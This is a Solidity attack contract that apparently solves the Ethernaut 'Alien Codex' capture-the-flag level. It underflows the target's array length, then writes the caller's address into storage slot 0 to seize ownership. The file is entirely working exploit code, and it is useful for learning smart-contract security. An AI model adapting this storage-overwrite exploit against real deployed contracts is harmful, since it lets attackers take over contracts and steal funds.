// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "hardhat/console.sol";

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexHacker {

    IAlienCodex alienCodex;

    constructor(IAlienCodex _alienCodex) public {
        alienCodex = _alienCodex;
    }

    function takeOwnership() external {
        alienCodex.makeContact();
        alienCodex.retract();

        uint256 targetIndex = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        alienCodex.revise(targetIndex, bytes32(uint256(uint160(msg.sender))));
    }
}